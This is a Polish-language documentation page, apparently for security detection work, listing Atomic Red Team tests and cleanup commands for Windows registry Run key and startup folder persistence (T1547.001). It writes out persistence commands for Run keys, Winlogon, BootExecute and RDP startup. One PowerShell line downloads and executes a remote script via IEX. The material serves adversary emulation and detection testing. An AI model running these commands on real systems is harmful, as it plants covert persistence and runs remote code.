# Alert: Registry Run Keys / Startup Folder

Opis scenariusza, podatności lub techniki.

---

**Technika:** T1547.001  
**Nazwa:** Registry Run Keys / Startup Folder  
**Taktyki:** Persistence, Privilege-Escalation  
**Status:** Pending  
**Autor:** Krzysztof K.  

---

<!--
Tactics: Persistence, Privilege-Escalation
Technique ID: T1547.001
Technique Name: Registry Run Keys / Startup Folder
Status: Pending
--> 


---

## Atomic Red Team – dostępne testy dla tej techniki

### Reg Key Run
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1547.001\Reg_Key_Run/test_1.cmd)

<b>Polecenia cleanup (cmd):</b>
```
REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /f >nul 2>&1
```
[Pobierz cleanup_1.cmd](../../scenarios/atomic_tests\T1547.001\Reg_Key_Run/cleanup_1.cmd)

### Reg Key RunOnce
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "#{thing_to_execute}"
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1547.001\Reg_Key_RunOnce/test_1.cmd)

<b>Polecenia cleanup (cmd):</b>
```
REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f >nul 2>&1
```
[Pobierz cleanup_1.cmd](../../scenarios/atomic_tests\T1547.001\Reg_Key_RunOnce/cleanup_1.cmd)

### PowerShell Registry RunOnce
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
$RunOnceKey = "#{reg_key_path}"
set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`")"'
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1547.001\PowerShell_Registry_RunOnce/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
Remove-ItemProperty -Path #{reg_key_path} -Name "NextRun" -Force -ErrorAction Ignore
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1547.001\PowerShell_Registry_RunOnce/cleanup_1.ps1)

### Suspicious vbs file run from startup Folder
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
Copy-Item "$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
Copy-Item "$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
cscript.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
cscript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1547.001\Suspicious_vbs_file_run_from_startup_Fol/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs" -ErrorAction Ignore
Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs" -ErrorAction Ignore
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1547.001\Suspicious_vbs_file_run_from_startup_Fol/cleanup_1.ps1)

### Suspicious jse file run from startup Folder
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
Copy-Item "$PathToAtomicsFolder\T1547.001\src\jsestartup.jse" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
Copy-Item "$PathToAtomicsFolder\T1547.001\src\jsestartup.jse" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
cscript.exe /E:Jscript "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
cscript.exe /E:Jscript "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1547.001\Suspicious_jse_file_run_from_startup_Fol/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse" -ErrorAction Ignore
Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse" -ErrorAction Ignore
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1547.001\Suspicious_jse_file_run_from_startup_Fol/cleanup_1.ps1)

### Suspicious bat file run from startup Folder
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
Copy-Item "$PathToAtomicsFolder\T1547.001\src\batstartup.bat" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
Copy-Item "$PathToAtomicsFolder\T1547.001\src\batstartup.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
Start-Process "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1547.001\Suspicious_bat_file_run_from_startup_Fol/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat" -ErrorAction Ignore
Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat" -ErrorAction Ignore
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1547.001\Suspicious_bat_file_run_from_startup_Fol/cleanup_1.ps1)

### Add Executable Shortcut Link to User Startup Folder
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
$Target = "C:\Windows\System32\calc.exe"
$ShortcutLocation = "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$Create = $WScriptShell.CreateShortcut($ShortcutLocation)
$Create.TargetPath = $Target
$Create.Save()
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1547.001\Add_Executable_Shortcut_Link_to_User_Sta/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
Remove-Item "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk" -ErrorAction Ignore
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1547.001\Add_Executable_Shortcut_Link_to_User_Sta/cleanup_1.ps1)

### Add persistance via Recycle bin
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
reg ADD "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command" /ve /d "calc.exe" /f
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1547.001\Add_persistance_via_Recycle_bin/test_1.cmd)

<b>Polecenia cleanup (cmd):</b>
```
reg DELETE "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open" /f
```
[Pobierz cleanup_1.cmd](../../scenarios/atomic_tests\T1547.001\Add_persistance_via_Recycle_bin/cleanup_1.cmd)

### SystemBC Malware-as-a-Service Registry
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
$RunKey = "#{reg_key_path}"
Set-ItemProperty -Path $RunKey -Name "socks5_powershell" -Value "#{reg_key_value}"
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1547.001\SystemBC_Malware-as-a-Service_Registry/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
Remove-ItemProperty -Path #{reg_key_path} -Name "socks5_powershell" -Force -ErrorAction Ignore
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1547.001\SystemBC_Malware-as-a-Service_Registry/cleanup_1.ps1)

### Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
New-Item -ItemType Directory -path "#{new_startup_folder}"
Copy-Item -path "#{payload}" -destination "#{new_startup_folder}"
Set-ItemProperty -Path  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Common Startup" -Value "#{new_startup_folder}"
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1547.001\Change_Startup_Folder_-_HKLM_Modify_User/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
Set-ItemProperty -Path  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Common Startup" -Value "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup"
Remove-Item "#{new_startup_folder}" -Recurse -Force
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1547.001\Change_Startup_Folder_-_HKLM_Modify_User/cleanup_1.ps1)

### Change Startup Folder - HKCU Modify User Shell Folders Startup Value
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
New-Item -ItemType Directory -path "#{new_startup_folder}"
Copy-Item -path "#{payload}" -destination "#{new_startup_folder}"
Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "#{new_startup_folder}"
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1547.001\Change_Startup_Folder_-_HKCU_Modify_User/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Remove-Item "#{new_startup_folder}" -Recurse -Force
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1547.001\Change_Startup_Folder_-_HKCU_Modify_User/cleanup_1.ps1)

### HKCU - Policy Settings Explorer Run Key
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
if (!(Test-Path -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")){
  New-Item -ItemType Key -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
}
Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "#{target_key_value_name}" -Value "#{payload}"
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1547.001\HKCU_-_Policy_Settings_Explorer_Run_Key/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
Remove-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "#{target_key_value_name}"
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1547.001\HKCU_-_Policy_Settings_Explorer_Run_Key/cleanup_1.ps1)

### HKLM - Policy Settings Explorer Run Key
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
if (!(Test-Path -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")){
  New-Item -ItemType Key -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
}
Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "#{target_key_value_name}" -Value "#{payload}"
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1547.001\HKLM_-_Policy_Settings_Explorer_Run_Key/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "#{target_key_value_name}"
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1547.001\HKLM_-_Policy_Settings_Explorer_Run_Key/cleanup_1.ps1)

### HKLM - Append Command to Winlogon Userinit KEY Value
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
$oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit");
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit-backup" -Value "$oldvalue";
$newvalue = $oldvalue + " #{payload}";
Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "$newvalue"
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1547.001\HKLM_-_Append_Command_to_Winlogon_Userin/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
$oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Userinit-backup');
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "$oldvalue";
Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Userinit-backup'
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1547.001\HKLM_-_Append_Command_to_Winlogon_Userin/cleanup_1.ps1)

### HKLM - Modify default System Shell - Winlogon Shell KEY Value
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
$oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell");
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell-backup" -Value "$oldvalue";
$newvalue = $oldvalue + ", #{payload}";
Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "$newvalue"
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1547.001\HKLM_-_Modify_default_System_Shell_-_Win/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
$oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Shell-backup');
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "$oldvalue";
Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Shell-backup'
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1547.001\HKLM_-_Modify_default_System_Shell_-_Win/cleanup_1.ps1)

### secedit used to create a Run key in the HKLM Hive
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
secedit /import /db #{secedit_db} /cfg "#{ini_file}"
secedit /configure /db #{secedit_db}
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1547.001\secedit_used_to_create_a_Run_key_in_the_/test_1.cmd)

<b>Polecenia cleanup (cmd):</b>
```
REG DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "calc" /f >nul 2>&1
```
[Pobierz cleanup_1.cmd](../../scenarios/atomic_tests\T1547.001\secedit_used_to_create_a_Run_key_in_the_/cleanup_1.cmd)

### Modify BootExecute Value
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
if (!(Test-Path "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg")) { reg.exe export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg" /y }
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "BootExecute" -Value "#{registry_value}" -Type MultiString
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1547.001\Modify_BootExecute_Value/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
reg.exe import "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"
Remove-Item -Path "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg" -Force
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1547.001\Modify_BootExecute_Value/cleanup_1.ps1)

### Allowing custom application to execute during new RDP logon session
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd" /f /v StartupPrograms /t REG_SZ /d "#{malicious_app}"
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1547.001\Allowing_custom_application_to_execute_d/test_1.cmd)

<b>Polecenia cleanup (cmd):</b>
```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd" /f /v StartupPrograms /t REG_SZ /d "rdpclip"
```
[Pobierz cleanup_1.cmd](../../scenarios/atomic_tests\T1547.001\Allowing_custom_application_to_execute_d/cleanup_1.cmd)

### Creating Boot Verification Program Key for application execution during successful boot
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d "#{malicious_file}"
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1547.001\Creating_Boot_Verification_Program_Key_f/test_1.cmd)

<b>Polecenia cleanup (cmd):</b>
```
reg delete HKLM\System\CurrentControlSet\Control\BootVerificationProgram /f
```
[Pobierz cleanup_1.cmd](../../scenarios/atomic_tests\T1547.001\Creating_Boot_Verification_Program_Key_f/cleanup_1.cmd)

### Add persistence via Windows Context Menu
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
reg add "HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify\command" /ve /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1547.001\Add_persistence_via_Windows_Context_Menu/test_1.cmd)

<b>Polecenia cleanup (cmd):</b>
```
reg delete "HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify" /f
```
[Pobierz cleanup_1.cmd](../../scenarios/atomic_tests\T1547.001\Add_persistence_via_Windows_Context_Menu/cleanup_1.cmd)

[Zobacz testy na GitHubie](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1547.001)
